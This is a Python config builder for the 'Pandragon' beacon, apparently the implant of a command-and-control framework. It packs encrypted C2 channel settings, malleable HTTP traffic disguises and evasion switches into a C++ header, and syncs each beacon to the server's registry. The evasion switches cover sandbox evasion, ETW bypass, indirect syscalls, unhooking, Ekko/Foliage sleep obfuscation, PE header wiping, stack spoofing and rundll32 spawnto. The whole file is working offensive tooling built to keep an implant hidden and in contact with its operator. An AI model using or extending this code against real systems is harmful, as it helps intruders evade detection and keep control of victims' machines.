#!/usr/bin/env python3
"""
Pandragon Beacon Config Builder

Converts JSON beacon configuration to binary blob and generates C++ header.
Uses XChaCha20-Poly1305 for config encryption and authentication.

Usage:
    pandragon-config-builder Beacon/config/default.json

Outputs:
    - Beacon/config/include/generated_config.h  (C++ header with embedded blob)
    - Beacon/config/default.bin (raw binary blob)
"""

import json
import struct
import sys
import os
import hashlib
import secrets
from datetime import datetime
from pathlib import Path

try:
    from Crypto.Cipher import ChaCha20_Poly1305
    from Crypto.Random import get_random_bytes
except ImportError:
    print("[!] Missing required dependency: pycryptodome")
    print("    pip install pycryptodome")
    sys.exit(1)

PCFG_VERSION = 0x0002
CONFIG_NONCE_SIZE = 24
CONFIG_MAC_SIZE = 16


def derive_beacon_id(crypto_key_hex: str) -> str:
    """Derive beacon_id from crypto_key using SHA-256 (first 8 bytes as hex)"""
    crypto_key_bytes = bytes.fromhex(crypto_key_hex)
    return hashlib.sha256(crypto_key_bytes).hexdigest()[:16]


def validate_config(config: dict, schema_path: str = None) -> bool:
    """Validate configuration against JSON schema"""
    if 'crypto_key' in config and 'beacon_id' not in config:
        config['beacon_id'] = derive_beacon_id(config['crypto_key'])
        print(f"[*] Auto-derived beacon_id: {config['beacon_id']}")
    elif 'crypto_key' in config and 'beacon_id' in config:
        expected_id = derive_beacon_id(config['crypto_key'])
        if config['beacon_id'] != expected_id:
            print(f"[!] beacon_id mismatch: expected {expected_id}, got {config['beacon_id']}")
            print(f"[!] Fix config or remove beacon_id to auto-derive")
            return False

    try:
        import jsonschema
    except ImportError:
        print("[!] Missing required dependency: jsonschema")
        print("    pip install jsonschema")
        return False

    if schema_path is None:
        schema_path = os.path.join(os.getcwd(), "Beacon", "config", "schema.json")
    if not os.path.exists(schema_path):
        print(f"[!] Schema file not found: {schema_path}")
        return False

    with open(schema_path, 'r') as f:
        schema = json.load(f)

    try:
        jsonschema.validate(instance=config, schema=schema)
    except jsonschema.ValidationError as e:
        print(f"[!] Schema validation failed: {e.message}")
        return False
    except jsonschema.SchemaError as e:
        print(f"[!] Schema error: {e.message}")
        return False

    if 'c2_channels' not in config:
        print("[!] Missing required field: c2_channels")
        return False

    if 'beacon_id' in config:
        if len(config['beacon_id']) != 16:
            print(f"[!] beacon_id must be 16 hex characters (8 bytes)")
            return False

    if len(config['crypto_key']) != 64:
        print(f"[!] crypto_key must be 64 hex characters (32 bytes)")
        return False

    if not config['c2_channels']:
        print(f"[!] c2_channels must have at least 1 entry")
        return False

    if config.get('lazy_checkin', False):
        if 'lazy_checkin_max' not in config:
            print("[!] lazy_checkin is true but lazy_checkin_max is not set")
            return False
        lazy_checkin_max = config['lazy_checkin_max']
        if not isinstance(lazy_checkin_max, int) or lazy_checkin_max < 1 or lazy_checkin_max > 255:
            print("[!] lazy_checkin_max must be an integer between 1 and 255")
            return False

    if 'indirect_syscall_pivot' in config:
        pivot = config['indirect_syscall_pivot']
        if not pivot:
            print("[!] indirect_syscall_pivot cannot be empty")
            return False
        if not pivot.startswith('Zw'):
            print("[!] indirect_syscall_pivot must start with 'Zw'")
            return False
        if pivot.startswith('Nt'):
            print("[!] 'Nt' functions are not allowed, use 'Zw' variant")
            return False

    return True


def parse_iso_date(date_str: str) -> int:
    """Parse human-readable timestamp to Unix timestamp (UTC)."""
    if not date_str or not isinstance(date_str, str):
        return 0

    from datetime import timezone

    cleaned = date_str.strip()
    if cleaned.endswith('Z'):
        cleaned = cleaned[:-1]

    for fmt in ("%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M", "%Y-%m-%d"):
        try:
            dt = datetime.strptime(cleaned, fmt)
            dt = dt.replace(tzinfo=timezone.utc)
            return int(dt.timestamp())
        except ValueError:
            continue

    return 0


def build_c2_channel(channel: dict, config: dict = None) -> bytes:
    """Build binary C2 channel entry with poll/submit split paths and 4 malleable blocks"""
    type_map = {'HTTP': 1, 'HTTPS': 2, 'TCP': 3, 'PIPE': 4}
    channel_type = type_map.get(channel['type'], 0)
    if channel_type == 0:
        raise ValueError(f"Unknown channel type: {channel['type']}")

    host = channel['host'].encode('utf-8')

    if channel_type in (3, 4):
        poll_path = channel.get('poll_path', '').encode('utf-8')
        submit_path = channel.get('submit_path', '').encode('utf-8')
        ua = channel.get('user_agent', '').encode('utf-8')
    else:
        poll_path = channel['poll_path'].encode('utf-8')
        submit_path = channel['submit_path'].encode('utf-8')
        ua = channel['user_agent'].encode('utf-8')

    if len(host) > 255 or len(poll_path) > 255 or len(submit_path) > 255 or len(ua) > 255:
        raise ValueError("C2 channel strings must be <= 255 bytes")

    if 'max_consecutive_failures' not in channel:
        raise ValueError("c2_channels[].max_consecutive_failures is required")
    if 'backoff_sleep_ms' not in channel:
        raise ValueError("c2_channels[].backoff_sleep_ms is required")

    max_failures = channel['max_consecutive_failures']
    backoff_ms = channel['backoff_sleep_ms']

    if not (1 <= max_failures <= 100):
        raise ValueError("max_consecutive_failures must be 1-100")
    if not (1000 <= backoff_ms <= 300000):
        raise ValueError("backoff_sleep_ms must be 1000-300000")

    # Header: type(1) + host_len(1) + poll_path_len(1) + submit_path_len(1) + ua_len(1) + reserved(1) + port(2) + max_failures(1)
    data = struct.pack('<BBBBBBHB',
                       channel_type,
                       len(host),
                       len(poll_path),
                       len(submit_path),
                       len(ua),
                       0,
                       channel['port'],
                       max_failures & 0xFF)
    data += struct.pack('<I', backoff_ms)
    data += host + poll_path + submit_path + ua

    # Helper to determine malleable mode
    def get_mode(key):
        if channel_type in (3, 4):
            return 0xFF
        elif key in channel and channel[key]:
            return 0x01
        else:
            return 0x00

    for mode_key, block_key in [
        ('poll_malleable_mode', 'poll_malleable_config'),
        ('submit_malleable_mode', 'submit_malleable_config'),
        ('poll_response_malleable_mode', 'poll_response_malleable_config'),
        ('submit_response_malleable_mode', 'submit_response_malleable_config'),
    ]:
        mode = get_mode(block_key)
        data += struct.pack('<B', mode)
        if mode == 0x01:
            data += build_malleable_block(channel[block_key])

    return data


def build_malleable_block(malleable: dict) -> bytes:
    """Build binary malleable config block"""
    data = b''

    wrapper = malleable.get('wrapper', {})
    prefix = wrapper.get('prefix', '').encode('utf-8')[:65535]
    suffix = wrapper.get('suffix', '').encode('utf-8')[:65535]

    data += struct.pack('<H', len(prefix))
    data += prefix
    data += struct.pack('<H', len(suffix))
    data += suffix

    headers = malleable.get('http_headers', [])
    header_count = min(len(headers), 255)
    data += struct.pack('<B', header_count)

    for hdr in headers[:255]:
        if 'name' not in hdr or not hdr['name']:
            raise ValueError("http_headers[].name is required")
        if 'value' not in hdr:
            raise ValueError("http_headers[].value is required")
        name = hdr['name'].encode('utf-8')[:255]
        value = hdr['value'].encode('utf-8')[:255]
        data += struct.pack('<B', len(name))
        data += struct.pack('<B', len(value))
        data += name
        data += value

    location = malleable.get('payload_location', {})
    if 'type' not in location:
        raise ValueError("payload_location.type is required (query_param, path, or body)")

    loc_type = location['type']
    type_map = {'query_param': 0, 'path': 1, 'body': 2}
    if loc_type not in type_map:
        raise ValueError("payload_location.type must be query_param, path, or body")
    loc_type_val = type_map[loc_type]
    data += struct.pack('<B', loc_type_val)

    if loc_type == 'query_param':
        if 'param_name' not in location or not location['param_name']:
            raise ValueError("payload_location.param_name is required for query_param type")
        param_name = location['param_name'].encode('utf-8')[:255]
    else:
        param_name = location.get('param_name', '').encode('utf-8')[:255]
    data += struct.pack('<B', len(param_name))
    data += param_name

    if loc_type == 'path':
        if 'path_prefix' not in location or not location['path_prefix']:
            raise ValueError("payload_location.path_prefix is required for path type")
        path_prefix = location['path_prefix'].encode('utf-8')[:255]
    else:
        path_prefix = location.get('path_prefix', '').encode('utf-8')[:255]
    data += struct.pack('<B', len(path_prefix))
    data += path_prefix

    if loc_type == 'path':
        if 'path_suffix' not in location or not location['path_suffix']:
            raise ValueError("payload_location.path_suffix is required for path type")
        path_suffix = location['path_suffix'].encode('utf-8')[:255]
    else:
        path_suffix = location.get('path_suffix', '').encode('utf-8')[:255]
    data += struct.pack('<B', len(path_suffix))
    data += path_suffix

    body_ct_map = {"text/plain": 0, "application/octet-stream": 1}
    body_ct = location.get('body_content_type', 'text/plain')
    if body_ct not in body_ct_map:
        body_ct = 'text/plain'
    data += struct.pack('<B', body_ct_map[body_ct])

    cookie_name = location.get('cookie_name', '').encode('utf-8')[:255]
    data += struct.pack('<B', len(cookie_name))
    data += cookie_name

    return data


def build_config_blob(config: dict) -> tuple:
    """
    Build complete config binary blob with XChaCha20-Poly1305 encryption.

    Returns: (blob, nonce, config_key, append_magic, append_data, pcfg_magic)
    """
    nonce = get_random_bytes(CONFIG_NONCE_SIZE)
    config_key = get_random_bytes(32)

    beacon_id = bytes.fromhex(config['beacon_id'])
    crypto_key = bytes.fromhex(config['crypto_key'])

    c2_data = b''
    for channel in config['c2_channels']:
        c2_data += build_c2_channel(channel, config)

    if 'sleep_ms' not in config:
        raise ValueError("sleep_ms is required")
    if 'jitter_pct' not in config:
        raise ValueError("jitter_pct is required")

    sleep_ms = config['sleep_ms']
    jitter_pct = config['jitter_pct']

    if not (100 <= sleep_ms <= 3600000):
        raise ValueError("sleep_ms must be 100-3600000")
    if not (0 <= jitter_pct <= 100):
        raise ValueError("jitter_pct must be 0-100")

    options = config.get('options', {})
    options_bitfield = 0
    if options.get('sandbox_evasion', False):
        options_bitfield |= 0x0001
    if options.get('debug_mode', False):
        options_bitfield |= 0x0002
    if 'kill_date' in config and config['kill_date']:
        kill_date = parse_iso_date(config['kill_date'])
        if kill_date:
            options_bitfield |= 0x0004
    if options.get('validate_ssl', True):
        options_bitfield |= 0x0008
    if options.get('bypass_etw', False):
        options_bitfield |= 0x0010
    if config.get('use_indirect_syscalls', False):
        options_bitfield |= 0x0020
    lazy_checkin = config.get('lazy_checkin', False)
    if lazy_checkin:
        options_bitfield |= 0x0040
    if config.get('lazy_unhook', False):
        options_bitfield |= 0x0080

    sleep_obf = config.get('sleep_obfuscation', 'none')
    sleep_obf_map = {'none': 0, 'ekko': 1, 'morpheus': 2, 'foliage': 3, 'ekko_runtime': 3}
    sleep_obf_val = sleep_obf_map.get(sleep_obf.lower(), 0)
    if sleep_obf_val:
        options_bitfield |= (sleep_obf_val & 0x03) << 8

    if config.get('sleep_wipe_pe_headers', False):
        options_bitfield |= 0x0400

    if config.get('sleep_stack_spoof', False):
        options_bitfield |= 0x0800

    if config.get('pad', False):
        options_bitfield |= 0x1000

    indirect_pivot_bytes = b''
    if config.get('use_indirect_syscalls', False):
        pivot_str = config.get('indirect_syscall_pivot', 'ZwSetDefaultLocale')
        if pivot_str:
            indirect_pivot_bytes = pivot_str.encode('ascii')

    kill_date = 0
    if 'kill_date' in config and config['kill_date']:
        kill_date = parse_iso_date(config['kill_date'])

    lazy_checkin_max = config.get('lazy_checkin_max', 1)

    plaintext = beacon_id
    plaintext += crypto_key
    plaintext += struct.pack('<B', len(config['c2_channels']))
    plaintext += c2_data

    append_magic = get_random_bytes(4)
    plaintext += struct.pack('<I', sleep_ms)
    plaintext += struct.pack('<B', jitter_pct)
    plaintext += struct.pack('<I', kill_date)
    plaintext += struct.pack('<H', options_bitfield)
    plaintext += struct.pack('<B', lazy_checkin_max)
    plaintext += struct.pack('<B', len(indirect_pivot_bytes))
    plaintext += indirect_pivot_bytes

    pad_max = config.get('pad_max', 1024)
    plaintext += struct.pack('<H', pad_max)

    num_spoof_frames = config.get('num_spoof_frames', 6)
    plaintext += struct.pack('<H', num_spoof_frames)

    max_response_size = config.get('max_response_size', 67108864)
    plaintext += struct.pack('<I', max_response_size)

    spawnto = config.get('spawnto', {})
    spawnto_x64 = spawnto.get('x64', 'C:\\Windows\\System32\\rundll32.exe')
    spawnto_x86 = spawnto.get('x86', 'C:\\Windows\\SysWOW64\\rundll32.exe')

    spawnto_x64_bytes = spawnto_x64.encode('utf-8')
    spawnto_x86_bytes = spawnto_x86.encode('utf-8')

    if len(spawnto_x64_bytes) > 255 or len(spawnto_x86_bytes) > 255:
        raise ValueError("spawnto paths must be <= 255 bytes")

    plaintext += struct.pack('<B', len(spawnto_x64_bytes))
    plaintext += spawnto_x64_bytes
    plaintext += struct.pack('<B', len(spawnto_x86_bytes))
    plaintext += spawnto_x86_bytes

    for global_key in [
        'poll_malleable_config',
        'submit_malleable_config',
        'poll_response_malleable_config',
        'submit_response_malleable_config',
    ]:
        block = config.get(global_key, {})
        if block:
            plaintext += b'\x01'
            plaintext += build_malleable_block(block)
        else:
            plaintext += b'\x00'

    work_hours = config.get('work_hours', {})
    if work_hours:
        plaintext += struct.pack('<B', 1 if work_hours.get('enabled', False) else 0)
        plaintext += struct.pack('<B', work_hours.get('start_hour', 9))
        plaintext += struct.pack('<B', work_hours.get('start_minute', 0))
        plaintext += struct.pack('<B', work_hours.get('end_hour', 17))
        plaintext += struct.pack('<B', work_hours.get('end_minute', 0))
        plaintext += struct.pack('<B', 1 if work_hours.get('insomnia', False) else 0)
    else:
        plaintext += b'\x00\x09\x00\x11\x00\x00'

    stack_chain = config.get('stack_spoof_chain', [])
    if not stack_chain:
        stack_chain = [
            {'module': 'ntdll.dll', 'function': 'RtlUserThreadStart'},
            {'module': 'kernel32.dll', 'function': 'BaseThreadInitThunk'},
        ]
    if len(stack_chain) > 256:
        raise ValueError("stack_spoof_chain must have at most 256 entries")
    plaintext += struct.pack('<H', len(stack_chain))
    for entry in stack_chain:
        off = entry.get('offset', 0)
        if not isinstance(off, int) or off < 0 or off > 0xFFFFFFFF:
            raise ValueError("offset must be an integer between 0 and 0xFFFFFFFF")
        mod = entry['module'].encode('utf-8')
        fn = entry['function'].encode('utf-8')
        if len(mod) > 255 or len(fn) > 255:
            raise ValueError("module and function names must be <= 255 bytes")
        plaintext += struct.pack('<I', off)
        plaintext += struct.pack('<B', len(mod)) + mod
        plaintext += struct.pack('<B', len(fn)) + fn

    im_append_strings = config.get('in_memory_append', {}).get('append', [])
    plaintext += struct.pack('<B', len(im_append_strings))
    for s in im_append_strings:
        if not isinstance(s, str):
            raise ValueError("in_memory_append.append items must be strings")
        s_bytes = s.encode('utf-8')
        if len(s_bytes) > 65535:
            raise ValueError("in_memory_append.append strings must be <= 65535 bytes")
        plaintext += struct.pack('<H', len(s_bytes)) + s_bytes

    append_strings = config.get('post_build', {}).get('append', [])
    append_data = b''
    for s in append_strings:
        if not isinstance(s, str):
            raise ValueError("post_build.append items must be strings")
        s_bytes = s.encode('utf-8')
        if len(s_bytes) > 65535:
            raise ValueError("post_build.append strings must be <= 65535 bytes")
        append_data += append_magic + struct.pack('<I', len(s_bytes)) + s_bytes

    cipher = ChaCha20_Poly1305.new(key=config_key, nonce=nonce)
    cipher.update(b'')
    ciphertext, mac = cipher.encrypt_and_digest(plaintext)

    pcfg_magic = secrets.randbits(32)

    header = struct.pack('<IHH',
                         pcfg_magic,
                         PCFG_VERSION,
                         0)
    header += nonce
    header += struct.pack('<I', len(ciphertext))

    blob = header + ciphertext + mac

    return blob, nonce, config_key, append_magic, append_data, pcfg_magic


def generate_cpp_header(blob: bytes, output_path: str, nonce: bytes, config_key: bytes, c2_channels: list, append_magic: bytes, sleep_obf_method: str = "ekko", pcfg_magic: int = None):
    """Generate C++ header with embedded encrypted config blob."""
    if pcfg_magic is None:
        pcfg_magic = struct.unpack('<I', blob[:4])[0]

    blob_with_magic = struct.pack('<I', pcfg_magic) + blob[4:]
    hex_lines = []
    for i in range(0, len(blob_with_magic), 16):
        chunk = blob_with_magic[i:i+16]
        hex_str = ', '.join(f'0x{b:02X}' for b in chunk)
        hex_lines.append(f"    {hex_str}")

    blob_array = ',\n'.join(hex_lines)

    nonce_array = ', '.join(f'0x{b:02X}' for b in nonce)
    key_array = ', '.join(f'0x{b:02X}' for b in config_key)
    append_magic_array = ', '.join(f'0x{b:02X}' for b in append_magic)

    enabled_transports = set()
    for ch in c2_channels:
        enabled_transports.add(ch['type'])

    transport_defines = ""
    for transport in ["HTTP", "HTTPS", "TCP", "PIPE"]:
        if transport in enabled_transports:
            transport_defines += f"#define PANDRAGON_ENABLE_{transport}\n"
        else:
            transport_defines += f"// #define PANDRAGON_ENABLE_{transport} // Disabled\n"

    ekko_impl_map = {"ekko": 1, "ekko_runtime": 2, "foliage": 1}
    ekko_impl_val = ekko_impl_map.get(sleep_obf_method.lower(), 0)

    cpp_header = f'''// AUTO-GENERATED CONFIG HEADER
// DO NOT EDIT - Generated by pandragon-config-builder
//
// Security: Config encrypted with XChaCha20-Poly1305
// - Nonce: {CONFIG_NONCE_SIZE} bytes
// - Key: {len(config_key)} bytes
// - MAC: {CONFIG_MAC_SIZE} bytes (Poly1305)
// - Append Magic: 4 bytes (build-specific, for post-build append)

#pragma once

#include <cstdint>

// Enabled Transports
{transport_defines}

// Config blob magic and version
#define PCFG_MAGIC 0x{pcfg_magic:08X}
#define PCFG_VERSION 0x0002  // XChaCha20-Poly1305 encrypted

// Ekko implementation selector (only relevant for ekko/ekko_runtime/foliage methods)
// 0 = unused (current method doesn't use Ekko), 1 = .obf section (static), 2 = runtime RX (dynamic)
#define EKKO_IMPL {ekko_impl_val}

// Encrypted config blob
constexpr uint8_t CONFIG_BLOB[] = {{
{blob_array}
}};

constexpr size_t CONFIG_BLOB_LEN = {len(blob_with_magic)};

// XChaCha20-Poly1305 decryption key (32 bytes)
constexpr uint8_t CONFIG_DECRYPT_KEY[{len(config_key)}] = {{
    {key_array}
}};

// XChaCha20 nonce (24 bytes)
constexpr uint8_t CONFIG_NONCE[{CONFIG_NONCE_SIZE}] = {{
    {nonce_array}
}};

// Post-build append magic (4 bytes, build-specific)
constexpr uint8_t APPEND_MAGIC[4] = {{
    {append_magic_array}
}};

// Helper macro to get header
#define GET_CONFIG_HEADER() reinterpret_cast<const PCFG_Header*>(CONFIG_BLOB)
'''

    if os.path.exists(output_path):
        with open(output_path, 'r') as f:
            existing = f.read()
        if existing == cpp_header:
            return

    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, 'w') as f:
        f.write(cpp_header)
    print(f"[+] Generated C++ header: {output_path}")


def main():
    if len(sys.argv) < 2:
        print("Usage: pandragon-config-builder <config.json> [output_dir]")
        sys.exit(1)

    config_path = sys.argv[1]
    output_dir = sys.argv[2] if len(sys.argv) > 2 else "Beacon/config"

    print(f"[*] Loading config: {config_path}")
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
    except Exception as e:
        print(f"[!] Failed to load config: {e}")
        sys.exit(1)

    if 'crypto_key' not in config:
        config['crypto_key'] = secrets.token_hex(32)
        print(f"[*] Auto-generated crypto_key: {config['crypto_key']}")

    if 'beacon_id' not in config:
        config['beacon_id'] = derive_beacon_id(config['crypto_key'])
        print(f"[*] Auto-derived beacon_id: {config['beacon_id']}")

    schema_path = os.path.join(os.path.dirname(os.path.abspath(config_path)), "schema.json")
    if not os.path.exists(schema_path):
        schema_path = os.path.join(os.getcwd(), "Beacon", "config", "schema.json")
    if not validate_config(config, schema_path):
        print("[!] Config validation failed")
        sys.exit(1)

    print("[+] Config validation passed")

    blob, nonce, config_key, append_magic, append_data, pcfg_magic = build_config_blob(config)
    print(f"[+] Built config blob: {len(blob)} bytes")
    print(f"    Encryption: XChaCha20-Poly1305")
    print(f"    Nonce: {nonce.hex()}")
    print(f"    Config Key: {config_key.hex()}")
    print(f"    Append Magic: {append_magic.hex()}")
    print(f"    PCFG Magic: 0x{pcfg_magic:08X}")

    config_name = Path(config_path).stem

    bin_output = os.path.join(output_dir, f"{config_name}.bin")
    with open(bin_output, 'wb') as f:
        f.write(blob)
    print(f"[+] Wrote binary blob: {bin_output}")

    if append_data:
        append_output = os.path.join(output_dir, f"{config_name}_append.bin")
        with open(append_output, 'wb') as f:
            f.write(append_data)
        print(f"[+] Wrote post-build append data: {append_output} ({len(append_data)} bytes, {len(config.get('post_build', {}).get('append', []))} strings)")

    header_output = os.path.join("Beacon", "include", "generated_config.h")
    generate_cpp_header(blob, header_output, nonce, config_key, config['c2_channels'], append_magic, config.get('sleep_obfuscation', 'ekko'), pcfg_magic)

    sync_beacon_to_server(config['beacon_id'], config['crypto_key'], config)

    print("\n" + "=" * 50)
    print("CONFIG SUMMARY")
    print("=" * 50)
    print(f"Beacon ID:    {config['beacon_id']}")
    print(f"Sleep:        {config.get('sleep_ms', 5000)}ms (+{config.get('jitter_pct', 0)}% jitter)")
    print(f"C2 Channels:  {len(config['c2_channels'])}")
    for i, ch in enumerate(config['c2_channels']):
        poll_path = ch.get('poll_path', '/')
        submit_path = ch.get('submit_path', '/')
        print(f"  [{i}] {ch['type']} {ch['host']}:{ch['port']}  poll={poll_path}  submit={submit_path}")
    print(f"Options:      sandbox_evasion={config.get('options', {}).get('sandbox_evasion', False)}, debug={config.get('options', {}).get('debug_mode', False)}, bypass_etw={config.get('options', {}).get('bypass_etw', False)}, indirect_syscalls={config.get('use_indirect_syscalls', False)}, lazy_unhook={config.get('lazy_unhook', False)}")
    print(f"Sleep Obf:    {config.get('sleep_obfuscation', 'none')}, wipe_pe={config.get('sleep_wipe_pe_headers', False)}, stack_spoof={config.get('sleep_stack_spoof', False)}, spoof_frames={config.get('num_spoof_frames', 6)}")
    if config.get('kill_date'):
        print(f"Kill Date:    {config['kill_date']}")
    print(f"Lazy Checkin:  enabled={config.get('lazy_checkin', False)}, max_polls={config.get('lazy_checkin_max', 'N/A')}")

    spawnto = config.get('spawnto', {})
    if spawnto:
        print(f"Spawnto:      x64='{spawnto.get('x64', 'default')}' x86='{spawnto.get('x86', 'default')}'")

    for block_name in ['poll_malleable_config', 'submit_malleable_config', 'poll_response_malleable_config', 'submit_response_malleable_config']:
        block = config.get(block_name, {})
        if block:
            label = block_name.replace('_config', '').replace('_', ' ').title()
            print(f"\nGlobal {label}:")
            wrapper = block.get('wrapper', {})
            if wrapper.get('prefix') or wrapper.get('suffix'):
                print(f"  Wrapper:   prefix='{wrapper.get('prefix', '')}' suffix='{wrapper.get('suffix', '')}'")
            headers = block.get('http_headers', [])
            if headers:
                print(f"  Headers:   {len(headers)} custom header(s)")
                for hdr in headers:
                    print(f"             {hdr['name']}: {hdr['value']}")
            location = block.get('payload_location', {})
            if location:
                loc_type = location.get('type', 'query_param')
                print(f"  Location:  {loc_type}")
                if loc_type == 'query_param':
                    print(f"             param_name: {location.get('param_name', '')}")
                elif loc_type == 'path':
                    print(f"             path_prefix: {location.get('path_prefix', '')}")
                    print(f"             path_suffix: {location.get('path_suffix', '')}")

    post_build = config.get('post_build', {})
    append_strings = post_build.get('append', [])
    if append_strings:
        print("\nPost-Build Append:")
        for i, s in enumerate(append_strings):
            print(f"  [{i}] {s!r} ({len(s)} bytes)")

    im_append = config.get('in_memory_append', {})
    im_append_strings = im_append.get('append', [])
    if im_append_strings:
        print("\nIn-Memory Append (encrypted in config blob):")
        for i, s in enumerate(im_append_strings):
            print(f"  [{i}] {s!r} ({len(s)} bytes)")

    print("=" * 50)

    print("\n[*] Build complete! Compile beacon with: make")


def sync_beacon_to_server(beacon_id: str, crypto_key: str, config: dict = None, server_file: str = None):
    """Sync beacon to server's known_beacons.json with its allowed routes."""
    if server_file is None:
        server_file = "server/known_beacons.json"

    known = {"version": 2, "beacons": {}}
    if os.path.exists(server_file):
        try:
            with open(server_file, 'r') as f:
                known = json.load(f)
                if "beacons" not in known:
                    known["beacons"] = {}
        except (json.JSONDecodeError, OSError):
            print(f"[!] Warning: Could not read {server_file}, starting fresh")

    allowed_routes = []
    for ch in config.get('c2_channels', []):
        def resolve_malleable(per_channel_key, global_key):
            if ch.get(per_channel_key):
                return ch[per_channel_key]
            elif config.get(global_key):
                return config[global_key]
            else:
                return None

        poll_mc = resolve_malleable('poll_malleable_config', 'poll_malleable_config')
        submit_mc = resolve_malleable('submit_malleable_config', 'submit_malleable_config')
        poll_rc = resolve_malleable('poll_response_malleable_config', 'poll_response_malleable_config')
        submit_rc = resolve_malleable('submit_response_malleable_config', 'submit_response_malleable_config')

        ch_type = ch.get('type', 'HTTP')
        is_tcp = ch_type in ('TCP', 'PIPE')

        def effective_config(mc):
            if is_tcp and mc:
                wrapper = mc.get('wrapper')
                return {'wrapper': wrapper} if wrapper else None
            return mc

        route = {
            "transport_type": ch_type,
            "poll_path": ch.get('poll_path', ''),
            "submit_path": ch.get('submit_path', ''),
            "port": ch.get('port', 0),
            "host": ch.get('host', ''),
            "user_agent": ch.get('user_agent', ''),
            "poll_malleable_config": effective_config(poll_mc),
            "submit_malleable_config": effective_config(submit_mc),
        }

        if poll_rc:
            route['poll_response_config'] = {
                'wrapper': {'prefix': poll_rc.get('wrapper', {}).get('prefix', ''), 'suffix': poll_rc.get('wrapper', {}).get('suffix', '')},
                'headers': poll_rc.get('headers', {}),
                'body_template': poll_rc.get('body_template', ''),
                'status_code': poll_rc.get('status_code', 200),
                'cookie_name': poll_rc.get('payload_location', {}).get('cookie_name', ''),
            }

        if submit_rc:
            route['submit_response_config'] = {
                'wrapper': {'prefix': submit_rc.get('wrapper', {}).get('prefix', ''), 'suffix': submit_rc.get('wrapper', {}).get('suffix', '')},
                'headers': submit_rc.get('headers', {}),
                'body_template': submit_rc.get('body_template', ''),
                'status_code': submit_rc.get('status_code', 200),
                'cookie_name': submit_rc.get('payload_location', {}).get('cookie_name', ''),
            }

        allowed_routes.append(route)

    known["beacons"][beacon_id] = {
        "crypto_key": crypto_key,
        "allowed_routes": allowed_routes,
    }

    try:
        import tempfile
        fd, tmp_path = tempfile.mkstemp(dir=os.path.dirname(server_file) or '.')
        with os.fdopen(fd, 'w') as f:
            json.dump(known, f, indent=2)
        os.replace(tmp_path, server_file)
        print(f"[+] Synced beacon to server: {server_file}")
    except Exception as e:
        print(f"[!] Warning: Could not sync beacon to server: {e}")


if __name__ == "__main__":
    main()
